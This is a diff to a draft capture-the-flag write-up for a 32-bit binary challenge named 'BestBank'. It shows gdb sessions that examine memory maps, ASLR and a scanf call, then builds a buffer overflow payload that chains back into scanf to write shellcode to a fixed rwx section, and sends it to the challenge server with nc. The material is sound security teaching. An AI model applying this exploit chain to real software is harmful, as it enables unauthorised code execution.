@@ -841,7 +841,7 @@ $ pidof bank
 $ cat /proc/28447/maps
 ```
 
-The output looks similar to this. The column headers were added for convenience.
+The output looks similar to this. The column headers are added for convenience.
 ```
 Start    End Addr RWX? Offset                                            Location/Description
 08048000-0804b000 r-xp 00000000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
@@ -861,11 +861,146 @@ f7fb8000-f7fb9000 rwxp 00026000 fd:01 8130737                            /lib/i3
 ff850000-ff871000 rwxp 00000000 00:00 0                                  [stack]
 ```
 
-If you run bank multiple times and print its proc map again, you'll find that the `f7d93000` addresses always change due to ASLR. However, `08048000` to `0804d000` always stay the same. Additionally, section `0804c000-0804d000` has `rwx` permissions (read, write, and execute). This section is particularly vulnerable to exploitation.
+A process's proc map can also be viewed in gdb with this command:
+```
+(gdb) info proc map
+```
 
-### RETITLE: Section about using the overflow exploit to first take control of the program. And then jump back to scanf with a 2nd payload to fully exploit the program..
+Run the bank program a few more times and print its proc map again. Notice that the `f7d93000` addresses always change due to ASLR. However, `08048000` to `0804d000` always stay the same. Additionally, section `0804c000-0804d000` has `rwx` permissions (read, write, and execute). This section is particularly vulnerable to exploitation.
+
+### Exploit Version 3: Jump to Scanf
+
+The payload cannot reliably jump back to the stack due to ASLR. Therefore, it has to write to and jump back to a reliable location in memory, like section `0804c000-0804d000`. 
 
 Now that section `0804c000-0804d000` is exposed as vulnerable, just need to write the payload to that location and jump to it. However, the payload writes to the stack first due to the program itself. But what if first took control of the program with one payload and then jumped back to scanf with a second craft exploit that will write to the desired vulnerable section. This can work..
+
+Will need to drill down into how scanf works. From Ghidra's decompiled C code [bank.c](bank.c), 
+```c
+uint captcha(void) {}
+    ...
+    printf("Captcha: ");
+    __isoc99_scanf(&DAT_0804a0f7,userCaptcha);
+    ...
+}
+```
+
+Set a breakpoint at the `printf` function (because its right before the scanf).
+
+Stop at the instruction just after the printf completes:
+```
+ _    _____    _____ _       _          _  __
+| |__|___ / __|_   _| |__   / \   _ __ | |/ /
+| '_ \ |_ \/ __|| | | '_ \ / _ \ | '_ \| ' /
+| |_) |__) \__ \| | | |_) / ___ \| | | | . \
+|_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\
+
+=> 0x8049040 <printf@plt>:	jmp    DWORD PTR ds:0x804c010
+0xffffd94c:	0x08049208	0x0804a0ed	0xf7fd676c	0x00000002
+0xffffd95c:	0x080491c1	0x00010001	0x00381ea0	0x62808426
+0xffffd96c:	0x62547333	0x004b6e41	0xffffd970	0xf7fdf289
+0xffffd97c:	0x000000d5	0xf7dd9cb8	0x677f9a5f	0xf7fd0110
+
+Breakpoint 3, 0x08049040 in printf@plt ()
+(gdb) finish
+Run till exit from #0  0x08049040 in printf@plt ()
+Captcha: => 0x8049208:	add    esp,0x10
+0xffffd950:	0x0804a0ed	0xf7fd676c	0x00000002	0x080491c1
+0xffffd960:	0x00010001	0x00381ea0	0x62808426	0x62547333
+0xffffd970:	0x004b6e41	0xffffd970	0xf7fdf289	0x000000d5
+0xffffd980:	0xf7dd9cb8	0x677f9a5f	0xf7fd0110	0xf7fdf73d
+0x08049208 in ?? ()
+(gdb) 
+```
+
+Which is instruction 0x8049208. Set a breakpoint at 0x8049208. Examine 10 instructions from 0x8049208.
+```
+(gdb) x/10i $eip
+=> 0x8049208:	add    esp,0x10
+   0x804920b:	sub    esp,0x8
+   0x804920e:	lea    eax,[ebp-0x3f4]      ; 0x3f4 = 1012, likely the location to store the captcha input
+   0x8049214:	push   eax
+   0x8049215:	lea    eax,[ebx-0x1f09]     ; 
+   0x804921b:	push   eax
+   0x804921c:	call   0x8049080 <__isoc99_scanf@plt>
+   0x8049221:	add    esp,0x10
+   ...
+(gdb) x/s $ebx-0x1f09
+0x804a0f7:	"%s"
+```
+
+Placeholder
+```
+CALL actually does this for you for example
+CALL my_func
+would do something like
+
+push ret_address
+jmp my_func
+```
+Continue the program until the scanf breakpoint hits:
+```
+(gdb) c
+Continuing.
+=> 0x8049080 <__isoc99_scanf@plt>:	jmp    DWORD PTR ds:0x804c020
+0xffffd94c:	0x08049221	0x0804a0f7	0xffffd974	0x00000002
+0xffffd95c:	0x080491c1	0x00010001	0x00381ea0	0x62808426
+0xffffd96c:	0x62547333	0x004b6e41	0xffffd970	0xf7fdf289
+0xffffd97c:	0x000000d5	0xf7dd9cb8	0x677f9a5f	0xf7fd0110
+
+Breakpoint 1, 0x08049080 in __isoc99_scanf@plt ()
+```
+
+Examine the first three values of the stack:
+```
+0x08049221	0x0804a0f7	0xffffd974
+```
+
+`0x08049221` is the return address:
+```
+0x804921c:	call   0x8049080 <__isoc99_scanf@plt>
+0x8049221:	add    esp,0x10
+^ 
+this is the return address after the scanf call completes
+```
+
+`0x0804a0f7` is `%s`:
+```
+(gdb) x/s 0x0804a0f7
+0x804a0f7:	"%s"
+```
+
+`0xffffd974` is the location that scanf will write to. To confirm this, continue the program and check this memory location:
+```
+(gdb) x/s 0xffffd974
+0xffffd974:	'A' <repeats 200 times>...
+```
+
+### New Section
+
+Ok now alls left to do is mock up the stack in this same way, jump to scanf and execute the payload! 
+
+First get the address of scanf, which we already have a breakpoint for:
+```
+0x08049080  __isoc99_scanf@plt
+```
+
+```
+scanf = struct.pack("I", 0x08049080)
+percentS = struct.pack("I", 0x0804a0f7)
+payloadAddress = struct.pack("I", 0x0804c000)
+payload = b'1 ' + b'A' * 1012 + b'BBBB' + scanf + payloadAddress + percentS + payloadAddress
+payload += b' ' + shellcode
+```
+
+This is it. Run the payload in gdb. It works. Run it without gdb; don't forget to chain cat so that u can control the shell:
+```
+$ (cat payload; cat) | ./bank
+``` 
+
+Now run it on the challenge server:
+```
+$ (cat payload; cat) | nc challenges.laptophackingcoffee.org 2168
+```
 
 # DRAFT SECTION:
 According to [Wikipedia][1]: uses of %s placeholders without length specifiers are inherently insecure and exploitable for buffer overflows. 
@@ -959,6 +1094,7 @@ TODO: remove all /zionperez/ folder names
 * [Intrigano: Return Oriented Programming (ROP)][19]
 * [Ahmed Demiai: Reversing Stripped ELF with GDB 64-Bit][20]
 * [GeeksforGeeks: How to compile 32-bit program on 64-bit in C and C++][21]
+* [StackOverflow: Substitutes for x86 assembly 'call' instruction?][22]
 
 [1]:https://en.wikipedia.org/wiki/Scanf_format_string#Vulnerabilities
 [2]:https://www.geeksforgeeks.org/difference-between-scanf-and-gets-in-c/
@@ -981,3 +1117,4 @@ TODO: remove all /zionperez/ folder names
 [19]:https://youtu.be/XZa0Yu6i_ew
 [20]:https://youtu.be/pF_prX9ZEHg
 [21]:https://www.geeksforgeeks.org/compile-32-bit-program-64-bit-gcc-c-c/
+[22]:https://stackoverflow.com/questions/7060970/substitutes-for-x86-assembly-call-instruction
